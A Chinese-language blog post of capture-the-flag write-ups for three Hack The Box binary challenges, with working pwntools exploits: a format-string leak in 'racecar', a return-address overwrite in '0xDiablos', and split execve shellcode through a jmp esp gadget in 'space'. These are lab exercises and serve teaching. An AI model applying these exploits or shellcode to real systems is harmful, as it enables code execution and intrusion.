---
layout: post
title: "hackbox wp"
date:   2022-3-10
tags: [ctf_wp]
comments: true
author: wsxk
---


- [racecar](#racecar)
  - [1.运行](#1运行)
  - [2.分析程序](#2分析程序)
  - [3.exp编写](#3exp编写)
- [You know 0xDiablos](#you-know-0xdiablos)
- [space ](#space-)
  - [1.简单分析](#1简单分析)
  - [2.IDA分析](#2ida分析)
  - [3.查看溢出点](#3查看溢出点)
  - [4.shellcode编写](#4shellcode编写)
  - [5.完整exp](#5完整exp)

## racecar<br>
### 1.运行
拿到文件，当然是先让他跑起来看看会发生什么

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-10-hackbox-pwn-racecar/1.png)

看起来是跑车小游戏

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-10-hackbox-pwn-racecar/2.png)

显然选项2才正常开始游戏

接下来让你选择车型，赛道

当我选完1车型 2赛道后，出现了奇怪的东西

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-10-hackbox-pwn-racecar/3.png)

打不开flag.txt

有点意思，这时候我们可以创建一个flag.txt然后往里面输点东西

之后出现的情况是下面这样的

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-10-hackbox-pwn-racecar/4.png)

### 2.分析程序

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-10-hackbox-pwn-racecar/5.png)

哦吼，看到了printf函数的格式化字符串漏洞

稍微调试一下

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-10-hackbox-pwn-racecar/6.png)

然后看下格式化字符串出现的东西

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-10-hackbox-pwn-racecar/7.png)


第11个就是我们输入的flag的4个字节啦

### 3.exp编写
编写exp有些值得质疑的点，比如收到的%x-%x...形式的字符串
需要去首尾空格，然后看看分片

用binascii库的 a2b_hex时，顺序的反的，需要倒过来



    from pwn import *
    from binascii import a2b_hex

    #io = process("./racecar")
    io = remote("178.128.168.198",30254)

    io.recvuntil("Name:")
    io.sendline("wsxk")
    io.recvuntil("Nickname:")
    io.sendline("wsxk")

    io.recvuntil("Car selection")
    io.sendline(str(2))
    io.recvuntil("Select car:")
    io.sendline(str(1))

    io.recvuntil("Select race:")
    io.sendline(str(2))

    io.recvuntil("Do you have anything to say to the press after your big victory?")
    io.sendline("%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x")

    io.recvuntil("The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this:")
    io.recvline()
    return_strings=io.recvline()
    #print(return_strings)

    flag = (bytes(return_strings).strip()).rsplit(b"-")
    print(flag)
    true_flag = b""
    for i in range(11,len(flag)):
        if len(flag[i])%2:
            flag[i] = b'0'+flag[i]
        #print(a2b_hex(flag[i])[::-1])
        true_flag += a2b_hex(flag[i])[::-1]
        if b"}" in true_flag:
            break
    print(true_flag)

## You know 0xDiablos<br>
太简单了以至于不想说乍做.....<br>

    from pwn import *

    io = remote("167.172.60.97",31012)
    #io = process("./vuln")
    #80491E2
    io.recvuntil("You know who are 0xDiablos:")
    payload = b'a'*188 + p32(0x80491E2)+p32(0xDEADBEEF)+p32(0xDEADBEEF)+p32(0xC0DED00D)

    #gdb.attach(io)
    io.sendline(payload)

    io.interactive()


## space <br>
这道题很有意思

### 1.简单分析

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-16-hackbox-pwn-space/1.png)

可以看出是一个32位的程序

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-16-hackbox-pwn-space/2.png)

什么保护也没加

运行一下看看

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-16-hackbox-pwn-space/3.png)

行吧，直接用IDA进行分析

### 2.IDA分析

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-16-hackbox-pwn-space/4.png)

可以看到，往buf里面读31个字节后进入vuln函数

    注意了，read函数不会自动帮你设置字符串末尾的'\x00'字符，所以，你读了31个字节，就是31个字节，不会在读入30个字节后自动停止！！！

继续往下看

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-16-hackbox-pwn-space/5.png)

好，找到漏洞点了，是栈溢出，根据先前看到的保护，考虑使用shellcode

### 3.查看溢出点

我们先试试要多少个字节才能覆盖ret的返回地址

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-16-hackbox-pwn-space/6.png)


![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-16-hackbox-pwn-space/7.png)

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-16-hackbox-pwn-space/8.png)

好，现在知道是18个字节

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-16-hackbox-pwn-space/9.png)

在这个地方还看到了jmp esp

是用shellcode了

### 4.shellcode编写

这道题shellcode显然是有限制的，先是不能太长，其次是不能含有'\x00'字符（strcpy会在遇到'\x00'字节后提前终止并返回）

我们知道，最多可以输入31个字符，覆盖地址是18~22个字符的位置，前面剩下18个字符，后面剩下9个字符

显然直接靠9个字符是无法shellcode的（我见过的最短的shellcode也要17给字节）

我们需要把shellcode分半，一部分放到0~18的位置

剩下一部分放入22~31的位置

中间覆盖的值是 jmp esp的地址

所以payload的格式是

shellcode_one + p32(jmp_esp) + shellcode_two

为了在执行shellcode_two后跳入shellcode_one,我们在shellcode_two中，我们需要在shellcode_two中加入跳转到shellcode_one的部分


    0:   31 c9                   xor    ecx, ecx
    2:   31 d2                   xor    edx, edx
    4:   83 ec 16                sub    esp, 0x16  #自己添加的
    7:   ff e4                   jmp    esp         #自己添加的
    9:   6a 0b                   push   0xb
    b:   58                      pop    eax
    c:   51                      push   ecx
    d:   68 2f 2f 73 68          push   0x68732f2f
    12:   68 2f 62 69 6e          push   0x6e69622f
    17:   89 e3                   mov    ebx, esp
    19:   cd 80                   int    0x80

为了看的方便，这里展示出shellcode的汇编意义,我把这段代码分成了0-9的部分和9-32的部分

shellcode的主要目标在于用int 80h命令

执行

execve('/bin//sh',0,0)

详情可以参考以下网址

[网址](https://blog.csdn.net/xiaominthere/article/details/17287965)

### 5.完整exp

    from pwn import *

    #io =process('./space')
    io = remote("167.71.134.138",31572)
    #print(asm("sub esp,22;jmp esp",arch='i386'))
    
    shellcode_one = b'\x31\xc9\x31\xd2\x83\xec\x16\xff\xe4'
    
    shellcode_two = b'\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
    
    payload = shellcode_two + p32(0x804919F)+shellcode_one
    #payload = b'aaaabaaacaaadaaaeaaafaaagaaahaa'
    #gdb.attach(io)
    
    io.sendline(payload)
    io.interactive()